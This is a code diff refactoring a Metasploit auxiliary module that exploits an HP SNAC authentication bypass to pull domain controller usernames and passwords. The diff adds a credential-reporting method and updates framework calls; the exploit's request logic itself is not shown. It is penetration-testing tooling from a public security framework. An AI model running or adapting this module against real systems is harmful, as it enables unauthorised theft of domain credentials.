@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'rexml/document'
 
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
@@ -42,7 +40,7 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(443)
-      ], self.class)
+      ])
   end
 
   def get_domain_info(session)
@@ -88,47 +86,75 @@ class Metasploit3 < Msf::Auxiliary
     return results
   end
 
+
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
+
   def run
 
-    print_status("#{peer} - Get Domain Info")
+    print_status("Get Domain Info")
     session = get_session
 
     if session.nil?
-      print_error("#{peer} - Failed to get a valid session, maybe the target isn't HP SNAC installation?")
+      print_error("Failed to get a valid session, maybe the target isn't HP SNAC installation?")
       return
     end
 
-    print_status("#{peer} - Exploiting Authentication Bypass to gather Domain Controller Info...")
+    print_status("Exploiting Authentication Bypass to gather Domain Controller Info...")
     domain_info = get_domain_info(session)
 
     if domain_info.nil?
-      print_error("#{peer} - Failed, maybe the target isn't vulnerable")
+      print_error("Failed, maybe the target isn't vulnerable")
       return
     end
 
-    print_status("#{peer} - Parsing data gathered...")
+    print_status("Parsing data gathered...")
     credentials = parse_domain_data(domain_info)
 
     if credentials.empty?
-      print_warning("#{peer} - Any Domain Controller has been found...")
+      print_warning("Any Domain Controller has been found...")
       return
     end
 
-    cred_table = Rex::Ui::Text::Table.new(
+    cred_table = Rex::Text::Table.new(
       'Header'  => 'Domain Controllers Credentials',
       'Indent'  => 1,
       'Columns' => ['Domain Controller', 'Username', 'Password']
     )
 
     credentials.each do |record|
-      report_auth_info({
-        :host  => record[0],
-        :port  => record[1],
-        :sname => record[2].downcase,
-        :user  => record[3],
-        :pass  => record[4],
-        :source_type => "vuln"
-      })
+      report_cred(
+        ip: record[0],
+        port: record[1],
+        service_name: record[2].downcase,
+        user: record[3],
+        password: record[4],
+        proof: domain_info.inspect
+      )
       cred_table << [record[0], record[3], record[4]]
     end
 
